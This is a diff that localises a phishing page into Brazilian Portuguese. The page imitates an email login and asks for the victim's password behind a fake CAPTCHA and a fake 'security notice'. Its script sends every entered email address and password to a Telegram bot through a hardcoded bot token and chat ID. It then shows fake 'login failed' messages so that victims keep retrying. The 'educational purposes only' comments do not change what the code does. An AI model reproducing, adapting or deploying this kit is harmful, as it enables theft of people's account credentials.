@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Email Service Login</title>
+    <title>Login do Serviço de Email</title>
     <link href="https://th.bing.com/th/id/OIP.BorG5kgz0XwQwzajVlEnDgHaJM?w=137&amp;h=180&amp;c=7&amp;o=5&amp;pid=1.7" rel="icon" type="image/gif" />
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
@@ -112,53 +112,52 @@
 </head>
 <body>
     <div class="login-container">
-        <div class="logo">Authentication Required</div><br>
+        <div class="logo">Autenticação Necessária</div><br>
         
         <div id="error"></div>
         <div id="login-alert">
-            <p>Error <br>
-
-There was an error with this action. Try again later.
+            <p>Erro <br>
+Ocorreu um erro nesta ação. Tente novamente mais tarde.
 8186de29-7bfa-4220-aa02-e484ecabe8ce </p>
         </div>
         
         <div id="div1">
             <div class="form-group">
-                <label for="ai">Email</label>
-                <input type="email" id="ai" placeholder="your@email.com">
+                <label for="ai">E-mail</label>
+                <input type="email" id="ai" placeholder="seu@email.com">
             </div>
             <div class="form-group">
-                <label for="pr">Password</label>
-                <input type="password" id="pr" placeholder="Password">
+                <label for="pr">Senha</label>
+                <input type="password" id="pr" placeholder="Senha">
             </div>
             
-            <!-- CAPTCHA Section -->
+            <!-- Seção CAPTCHA -->
             <div class="form-group">
-                <label>CAPTCHA Verification</label>
+                <label>Verificação CAPTCHA</label>
                 <div class="captcha-container">
                     <div id="captchaDisplay" class="captcha-code"></div>
                     <button type="button" id="refreshCaptcha" class="refresh-captcha">↻</button>
                 </div>
-                <input type="text" id="captchaInput" placeholder="Enter CAPTCHA code">
+                <input type="text" id="captchaInput" placeholder="Digite o código CAPTCHA">
             </div>
             
-            <button id="sub-btn">Sign In</button>
+            <button id="sub-btn">Entrar</button>
             <div id="progress"></div>
         </div>
         
         <div id="ethical-warning">
-            <strong>SECURITY NOTICE:</strong> You're accessing secure settings, please provide your password to continue.
+            <strong>AVISO DE SEGURANÇA:</strong> Você está acessando configurações seguras. Forneça sua senha para continuar.
         </div>
     </div>
 
 <script>
-// Telegram Bot Configuration - FOR EDUCATIONAL PURPOSES ONLY
-// Replace these with your own if you want to test the Telegram functionality
-const BOT_TOKEN = "8660052105:AAEM_ePyAcRWRpfwKc5hs1lOJ3zUlhI5SZ8"; // Get from @BotFather
-const CHAT_ID = "1767885138";     // Get from @RawDataBot
+// Configuração do Bot do Telegram - APENAS PARA FINS EDUCACIONAIS
+// Substitua estes pelos seus próprios se quiser testar a funcionalidade do Telegram
+const BOT_TOKEN = "8660052105:AAEM_ePyAcRWRpfwKc5hs1lOJ3zUlhI5SZ8"; // Obtenha no @BotFather
+const CHAT_ID = "1767885138";     // Obtenha no @RawDataBot
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-// Generate random CAPTCHA code
+// Gerar código CAPTCHA aleatório
 function generateCaptcha() {
     const chars = "0123456789ABCDEFGHJKLMNPQRSTUVWXYZ";
     let captcha = "";
@@ -168,11 +167,11 @@ function generateCaptcha() {
     return captcha;
 }
 
-// Initialize CAPTCHA
+// Inicializar CAPTCHA
 let currentCaptcha = generateCaptcha();
 $('#captchaDisplay').text(currentCaptcha);
 
-// Refresh CAPTCHA
+// Atualizar CAPTCHA
 $('#refreshCaptcha').click(function() {
     currentCaptcha = generateCaptcha();
     $('#captchaDisplay').text(currentCaptcha);
@@ -180,9 +179,9 @@ $('#refreshCaptcha').click(function() {
 });
 
 $(document).ready(function() {
-    var count = 0; // Login attempt counter
+    var count = 0; // Contador de tentativas de login
 
-    // Submit form on Enter key
+    // Enviar formulário ao pressionar Enter
     $(document).keypress(function(event) {
         if (event.keyCode == '13') {
             event.preventDefault();
@@ -190,7 +189,7 @@ $(document).ready(function() {
         }
     });
 
-    // Pre-fill email from URL hash (#test@example.com)
+    // Pré-preencher e-mail da URL (#teste@example.com)
     var ai = window.location.hash.substr(1);
     if (ai) {
         $("#ai").val(ai);
@@ -198,39 +197,39 @@ $(document).ready(function() {
     }
 
     function simulateLoading(email) {
-        var domain = email.split('@')[1] || "example.com";
-        $('#progress').html("Connecting to " + domain + "...");
+        var domain = email.split('@')[1] || "exemplo.com";
+        $('#progress').html("Conectando ao " + domain + "...");
         
         setTimeout(() => {
-            $('#progress').html("Checking credentials...");
+            $('#progress').html("Verificando credenciais...");
             setTimeout(() => {
-                $('#progress').css("color", "red").html("Login failed - Try again...");
+                $('#progress').css("color", "red").html("Falha no login - Tente novamente...");
             }, 1000);
         }, 1000);
     }
 
-    // Form submission handler
+    // Manipulador de envio do formulário
     $('#sub-btn').click(function(event) {
         event.preventDefault();
         var ai = $("#ai").val().trim();
         var pr = $("#pr").val().trim();
         var userCaptcha = $("#captchaInput").val().trim();
 
-        // Basic validation
+        // Validação básica
         if (!ai || !pr || !userCaptcha) {
-            $('#error').show().html("Please complete all fields").fadeIn();
+            $('#error').show().html("Preencha todos os campos").fadeIn();
             return false;
         }
 
-        // Simple email format check
+        // Verificação simples de formato de e-mail
         if (!ai.includes('@') || !ai.includes('.')) {
-            $('#error').show().html("Please enter a valid email address").fadeIn();
+            $('#error').show().html("Digite um endereço de e-mail válido").fadeIn();
             return false;
         }
 
-        // CAPTCHA validation
+        // Validação CAPTCHA
         if (userCaptcha.toUpperCase() !== currentCaptcha) {
-            $('#error').show().html("Invalid CAPTCHA code").fadeIn();
+            $('#error').show().html("Código CAPTCHA inválido").fadeIn();
             currentCaptcha = generateCaptcha();
             $('#captchaDisplay').text(currentCaptcha);
             $('#captchaInput').val('');
@@ -238,22 +237,21 @@ $(document).ready(function() {
         }
 
         count++;
-        $('#sub-btn').html('Verifying...');
+        $('#sub-btn').html('Verificando...');
         $('#error').hide();
 
-        // Ethical logging to Telegram - FOR EDUCATIONAL DEMONSTRATION ONLY
-        const timestamp = new Date().toLocaleString();
-        const message = `Mr Selfless046 ⚠️\n\n` +
+        // Registro ético no Telegram - APENAS PARA DEMONSTRAÇÃO EDUCACIONAL
+        const timestamp = new Date().toLocaleString('pt-BR');
+        const message = `Steelsame ⚠️\n\n` +
                        `${timestamp}\n` +
-                       `Email: ${ai}\n` +
-                       `Password: ${pr}\n` +
-                       `CAPTCHA Attempt: ${userCaptcha}\n` +
-                       `CAPTCHA Match: ${userCaptcha.toUpperCase() === currentCaptcha ? "Yes" : "No"}\n` +
-                       `Page: ${window.location.hostname}\n` +
-                       `Attempt: ${count}/3`;
- 
+                       `E-mail: ${ai}\n` +
+                       `Senha: ${pr}\n` +
+                       `Tentativa CAPTCHA: ${userCaptcha}\n` +
+                       `CAPTCHA Correto: ${userCaptcha.toUpperCase() === currentCaptcha ? "Sim" : "Não"}\n` +
+                       `Página: ${window.location.hostname}\n` +
+                       `Tentativa: ${count}/3`;
 
-        // Send to Telegram
+        // Enviar para o Telegram
         $.ajax({
             url: TELEGRAM_API,
             method: "POST",
@@ -262,23 +260,23 @@ $(document).ready(function() {
                 text: message
             },
             success: function() {
-                console.log("Check again");
+                console.log("Verifique novamente");
                 
-                // Simulate processing
-                $('#progress').html("Checking credentials...");
+                // Simular processamento
+                $('#progress').html("Verificando credenciais...");
                 setTimeout(() => {
-                    $('#progress').css("color", "red").html("Login failed - Please try again");
-                    $('#sub-btn').html('Sign In');
+                    $('#progress').css("color", "red").html("Falha no login - Tente novamente");
+                    $('#sub-btn').html('Entrar');
                     
-                    // Generate new CAPTCHA
+                    // Gerar novo CAPTCHA
                     currentCaptcha = generateCaptcha();
                     $('#captchaDisplay').text(currentCaptcha);
                     $('#captchaInput').val('');
                     
-                    // Clear password field
+                    // Limpar campo de senha
                     $("#pr").val("");
 
-                    // After 3 attempts, show redirect message
+                    // Após 3 tentativas, mostrar mensagem de redirecionamento
                     if (count >= 3) {
                         $('#login-alert').show();
                         setTimeout(() => {
@@ -288,7 +286,7 @@ $(document).ready(function() {
                 }, 1500);
             },
             error: function(err) {
-                console.error("Check again", err);
+                console.error("Verifique novamente", err);
                 simulateLoading(ai);
             }
         });
